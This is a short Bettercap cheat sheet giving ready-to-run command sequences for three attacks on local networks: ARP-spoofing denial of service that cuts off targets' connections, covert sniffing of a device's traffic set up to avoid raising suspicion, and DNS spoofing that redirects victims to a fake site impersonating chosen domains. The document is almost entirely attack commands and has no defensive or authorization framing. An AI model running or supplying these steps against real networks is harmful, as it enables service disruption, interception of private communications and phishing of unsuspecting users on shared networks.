**Prerequisite:** Must have Bettercap installed. Instructions [here](https://www.bettercap.org/project/installation/).

**Launch Bettercap:** `sudo bettercap`

**Useful commands:**
- Show customizable settings: `get <command to search>*`
E.g: `get arp.spoof*`

- Show status of available modules: `help`


## **Cut off one, many or all internet connections in a network (Denial Of Service):**

1. `net.probe on` - Start probing every IPs to detect those that are in use within the network.

2. *(optional)* `net.show` - Show list of alive IPs. Can be extremely useful for identifying the intended target(s).

3. `set arp.spoof.targets <IP or range>` - Set target(s) to attack. Leave unset to attack hosts.

4. `set arp.spoof.forwarding false` - Disallow intercepted packets to continue, dropping the targets' connection.

5. `set arp.spoof.fullduplex true` - Spoof both the targets and the gateway.

6. `arp.spoof on` - start DOSing.


## **Sniff on a device's network activity:**

1. `net.probe on` - Start probing every IPs to detect those that are in use within the network.

2. *(optional)* `net.show` - Show list of alive IPs. Can be extremely useful for identifying the intended target(s).

3. `set arp.spoof.targets <IP or range>` - Set target(s) to attack. Leave unset to attack all hosts.

4. `set arp.spoof.forwarding true` - Allow intercepted packets to continue, avoiding raising suspicion.

5. `set arp.spoof.fullduplex true` - Spoof both the targets and the gateway.

6. `arp.spoof on` - Start ARP Spoofing.

7. `net.sniff on` - Start sniffing on packets.


## **Redirect traffic to a fake site (DNS Spoofing)**

1. `net.probe on` - Start probing every IPs to detect those that are in use within the network.

2. *(optional)* `net.show` - Show list of alive IPs. Can be extremely useful for identifying the intended target(s).

3. `set arp.spoof.targets <IP or range>` - Set target(s) to sniff packets. Leave unset to sniff all hosts.

4. `set arp.spoof.forwarding true` - Allow intercepted packets to continue, avoiding raising suspicion.

5. `set arp.spoof.fullduplex true` - Spoof both the targets and the gateway.

6. `arp.spoof on` - Start ARP Spoofing.

7. `set dns.spoof.domains <targeted domain(s)>` - Set the legitimate domain(s) to impersonate. Set to "*" to target all domains (will break many applications and websites on the targeted device).

8. `set dns.spoof.address <IP>` - Set the IP that the target will be redirected to when attempting access to the above domain.

9. `dns.spoof on` - Start DNS Spoofing.
